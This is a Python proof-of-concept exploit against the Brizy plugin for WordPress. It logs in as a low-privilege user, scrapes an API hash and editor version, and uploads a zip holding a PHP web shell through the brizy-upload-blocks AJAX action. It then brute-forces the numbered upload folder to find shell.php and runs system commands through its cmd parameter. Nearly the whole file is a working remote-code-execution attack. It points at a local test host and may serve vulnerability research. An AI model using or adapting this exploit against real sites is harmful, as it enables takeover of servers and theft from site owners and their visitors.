import re

import requests

USER = 'user'
PASSWORD = 'user'
TARGET = 'http://wordpress.local:1337'

session = requests.session()


session.proxies = {'http': 'http://localhost:8080'}


def do_login(username, password):
    session.get(f'{TARGET}/wp-login.php')
    data = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'testcookie': 1
    }
    r = session.post(f'{TARGET}/wp-login.php', data=data, allow_redirects=False)

    if r.status_code == 302:
        print(f"[+] Login Successful")
        return True

    print(r.text)
    print(f"[-] Login Failed")


def get_nonce_and_version():
    r = session.get(f'{TARGET}/wp-admin/')
    nonce_pattern = r'ruleApiHash":"([a-zA-Z0-9]+)"'
    nonce = re.search(nonce_pattern, r.text)

    version_pattern = r'editorVersion":\s*"([a-zA-Z0-9-]+)"'
    version = re.search(version_pattern, r.text)

    return nonce.group(1), version.group(1)


def upload_zip(nonce, version):
    files = {'files[]': ('exploit.zip', open('./exploit.zip', 'rb'))}
    data = {
        'version': version,
        'hash': nonce,
        'action': 'brizy-upload-blocks',
    }

    r = session.post(f'{TARGET}/wp-admin/admin-ajax.php', files=files, data=data)

    if not r.ok or not r.json()['success']:
        print(r.text)
        print(f"[!] Upload failed")
        return False
    print(r.json())
    return True


def execute_shell(cmd, n=42):
    r = session.get(f'{TARGET}/wp-content/uploads/brizy/{n}/assets/images/shell.php?cmd={cmd}')
    if not r.ok:
        return False

    output = r.text.strip()

    if '~~~SHELL~OUTPUT~BELOW~~~' in output:
        # Strip away image output
        output = ''.join(output.split('~~~SHELL~OUTPUT~BELOW~~~')[1:]).strip()

    print(f'[+] Shell: {cmd}')
    print(f'└─ {output}')
    return output


def find_shell():
    for i in range(0, 200):
        if execute_shell('id', i):
            return i
    return False


def exploit():
    if not do_login(USER, PASSWORD):
        return False

    nonce, version = get_nonce_and_version()
    if not nonce:
        return False

    print(f"[+] Nonce {nonce}")
    print(f"[+] Version {version}")
    print(f"[+] Uploading zip")

    if not upload_zip(nonce, version):
        return

    print(f"[?] Finding Shell:")
    n = find_shell()

    if not n:
        print(f"[!] Error could not find shell")
        return

    print(f"[+] Shell: /wp-content/uploads/brizy/{n}/assets/images/shell.php?cmd=id")

    print(f"[+] Testing Shell:")
    execute_shell('id', n)
    execute_shell('pwd', n)


exploit()
